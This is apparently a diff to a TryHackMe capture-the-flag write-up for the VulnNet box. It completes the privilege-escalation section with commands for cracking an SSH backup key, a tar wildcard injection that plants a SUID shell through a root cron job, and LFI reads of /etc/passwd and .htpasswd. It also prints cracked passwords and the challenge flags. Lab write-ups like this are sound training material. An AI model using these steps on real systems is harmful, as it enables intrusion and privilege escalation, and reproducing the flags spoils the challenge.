@@ -4,7 +4,7 @@
 
 [![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
 [![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](https://tryhackme.com)
-[![Status](https://img.shields.io/badge/Status-Partial-yellow?style=for-the-badge)](https://tryhackme.com)
+[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
 [![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)
 
 ---
@@ -16,9 +16,9 @@
 | **Target** | `10.113.163.115` / `vulnnet.thm` |
 | **OS** | Ubuntu 18.04 (Apache 2.4.29 / OpenSSH 7.6p1) |
 | **Attack Surface** | LFI via `php://filter`, HTTP Basic Auth bypass, ClipBucket 4.0 arbitrary file upload |
-| **Privesc** | In progress |
+| **Privesc** | World-readable SSH backup → key crack → tar wildcard injection → SUID bash |
 
-VulnNet Entertainment runs a decoy marketing site on the main domain hiding a ClipBucket 4.0 instance behind HTTP Basic Auth on a subdomain. The subdomain is leaked through JS bundle analysis. A Local File Inclusion vulnerability in the `referer` parameter — filtered against direct traversal but not `php://filter` — allows reading arbitrary files from disk, including the Apache `.htpasswd` file. Cracking the Apache MD5 hash unlocks the ClipBucket portal, which is vulnerable to unauthenticated arbitrary file upload via `/actions/beats_uploader.php` (EDB-44250), yielding RCE as `www-data`.
+VulnNet Entertainment runs a decoy marketing site on the main domain hiding a ClipBucket 4.0 instance behind HTTP Basic Auth on a subdomain. The subdomain is leaked through JS bundle analysis. A Local File Inclusion vulnerability in the `referer` parameter — filtered against direct traversal but not `php://filter` — allows reading arbitrary files from disk, including the Apache `.htpasswd` file. Cracking the hash unlocks ClipBucket, which is vulnerable to arbitrary file upload via `/actions/beats_uploader.php` (EDB-44250), yielding RCE as `www-data`. From there, a world-readable SSH backup exposes an encrypted RSA key for `server-management`; cracking the passphrase gives a shell and `user.txt`. Root comes via a tar wildcard injection against a cron job running every two minutes, which drops a SUID bit on `/bin/bash`.
 
 ---
 
@@ -103,7 +103,7 @@ Real user on box: `server-management`. MySQL also running locally.
 
 ### `lfi.py` — LFI File Reader
 
-> 📁 [`exploits/lfi.py`](exploits/lfi.py)
+> 📁 [`Exploit-Scripts/lfi.py`](../Exploit-Scripts/lfi.py)
 
 ```python
 #!/usr/bin/env python3
@@ -166,18 +166,12 @@ if __name__ == "__main__":
 ### Files Read via LFI
 
 ```bash
-python3 exploits/lfi.py -f /etc/passwd
-python3 exploits/lfi.py -f /etc/apache2/sites-enabled/000-default.conf
-python3 exploits/lfi.py -f /etc/apache2/.htpasswd
+python3 Exploit-Scripts/lfi.py -f /etc/passwd
+python3 Exploit-Scripts/lfi.py -f /etc/apache2/sites-enabled/000-default.conf
+python3 Exploit-Scripts/lfi.py -f /etc/apache2/.htpasswd
 ```
 
-The Apache vhost config revealed the `.htpasswd` path:
-
-```
-/etc/apache2/.htpasswd
-```
-
-Contents:
+The Apache vhost config revealed the `.htpasswd` path. Contents:
 
 ```
 developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
@@ -206,7 +200,7 @@ ClipBucket versions prior to 4.0.0 Release 4902 are vulnerable to arbitrary file
 
 ### `cb_upload.py` — ClipBucket File Upload Exploit
 
-> 📁 [`exploits/cb_upload.py`](exploits/cb_upload.py)
+> 📁 [`Exploit-Scripts/cb_upload.py`](../Exploit-Scripts/cb_upload.py)
 
 ```python
 #!/usr/bin/env python3
@@ -290,7 +284,7 @@ if __name__ == "__main__":
 ### RCE Confirmed
 
 ```bash
-python3 exploits/cb_upload.py -H broadcast.vulnnet.thm -c developers:9972761drmfsls
+python3 Exploit-Scripts/cb_upload.py -H broadcast.vulnnet.thm -c developers:9972761drmfsls
 ```
 
 ```
@@ -311,7 +305,103 @@ RCE confirmed as `www-data`.
 
 ## 🔁 Privilege Escalation
 
-> ⚠️ **In progress** — writeup continues once the box is rooted.
+### www-data → server-management — SSH Key from Backup
+
+Searched for files owned by `server-management`:
+
+```bash
+find / -type f -user server-management 2>/dev/null
+```
+
+```
+/var/backups/ssh-backup.tar.gz
+```
+
+World-readable. Pulled it back, extracted an encrypted RSA private key, and cracked the passphrase:
+
+```bash
+cp /var/backups/ssh-backup.tar.gz /tmp && cd /tmp
+tar -xzf ssh-backup.tar.gz
+ssh2john id_rsa > id_rsa.hash
+john --wordlist=./rockyou.txt id_rsa.hash
+```
+
+```
+oneTWO3gOyac     (id_rsa)
+```
+
+SSH in:
+
+```bash
+ssh -i id_rsa server-management@10.113.163.115
+# passphrase: oneTWO3gOyac
+```
+
+```bash
+cat ~/user.txt
+```
+
+```
+THM{907e420d979d8e2992f3d7e16bee1e8b}
+```
+
+### server-management → root — Tar Wildcard Injection
+
+Checked running cron jobs:
+
+```bash
+cat /etc/crontab
+```
+
+```
+*/2 * * * * root /var/opt/backupsrv.sh
+```
+
+Read the script:
+
+```bash
+cat /var/opt/backupsrv.sh
+```
+
+```bash
+cd /home/server-management/Documents
+tar czf $dest/$archive_file *
+```
+
+The `*` wildcard expands in the shell before tar receives arguments. Filenames that look like flags are passed directly as tar flags. Creating `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` causes tar to execute `shell.sh` as root when the cron fires.
+
+```bash
+cd ~/Documents
+
+cat > shell.sh << 'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+
+chmod +x shell.sh
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+```
+
+Waited for cron to fire (up to 2 minutes), watched for the SUID bit:
+
+```bash
+watch -n 1 'ls -lah /bin/bash'
+```
+
+Once `-rwsr-sr-x` appeared:
+
+```bash
+/bin/bash -p
+```
+
+```bash
+cat /root/root.txt
+```
+
+```
+THM{220b671dd8adc301b34c2738ee8295ba}
+```
 
 ---
 
@@ -338,12 +428,16 @@ RCE confirmed as `www-data`.
     → PHP webshell uploaded → RCE as www-data
           │
           ▼
-[Privilege Escalation]
-    ???
+[World-Readable SSH Backup]
+    /var/backups/ssh-backup.tar.gz → encrypted id_rsa
+    john + rockyou → passphrase: oneTWO3gOyac
+    → SSH as server-management → user.txt
           │
           ▼
-[root]
-    ???
+[Tar Wildcard Injection]
+    /var/opt/backupsrv.sh runs as root every 2 min
+    tar * in ~/Documents → --checkpoint flag injection → chmod +s /bin/bash
+    → /bin/bash -p → root → root.txt
 ```
 
 ---
@@ -354,7 +448,8 @@ RCE confirmed as `www-data`.
 * JS bundles in single-page apps routinely leak internal hostnames, subdomain structure, and API endpoint shapes — always read the source
 * Apache `.htpasswd` files are often world-readable on misconfigured servers; LFI directly into credential files skips the need for any other recon path
 * ClipBucket 4.0 (pre-4902) has no server-side MIME validation on the beats uploader — the endpoint trusts the client-supplied filename extension entirely
-* HTTP Basic Auth protecting an admin panel means credentials are the only barrier — once cracked, every vulnerability in the app is fully exposed
+* Backup files owned by a specific user but left world-readable are a direct path to credential material — always check `/var/backups` after getting a foothold
+* Tar wildcard injection is a classic cron privesc: any `tar *` running as a privileged user in a directory you can write to is exploitable
 
 ---
 
@@ -365,15 +460,15 @@ RCE confirmed as `www-data`.
 | `nmap` | Port scanning |
 | `ffuf` | Directory and subdomain fuzzing |
 | Burp Suite | Proxy, JS source analysis |
-| `john` | Apache MD5 hash cracking |
-| [`exploits/lfi.py`](exploits/lfi.py) | Custom LFI file reader via `php://filter` |
-| [`exploits/cb_upload.py`](exploits/cb_upload.py) | ClipBucket 4.0 arbitrary file upload RCE |
+| `john` | Apache MD5 + SSH key passphrase cracking |
+| [`Exploit-Scripts/lfi.py`](../Exploit-Scripts/lfi.py) | Custom LFI file reader via `php://filter` |
+| [`Exploit-Scripts/cb_upload.py`](../Exploit-Scripts/cb_upload.py) | ClipBucket 4.0 arbitrary file upload RCE |
 
 ---
 
 ## 🚩 Flags
 
-| Flag | Status |
+| Flag | Value |
 | --- | --- |
-| `user.txt` | ⏳ Pending |
-| `root.txt` | ⏳ Pending |
+| `user.txt` | `THM{907e420d979d8e2992f3d7e16bee1e8b}` |
+| `root.txt` | `THM{220b671dd8adc301b34c2738ee8295ba}` |
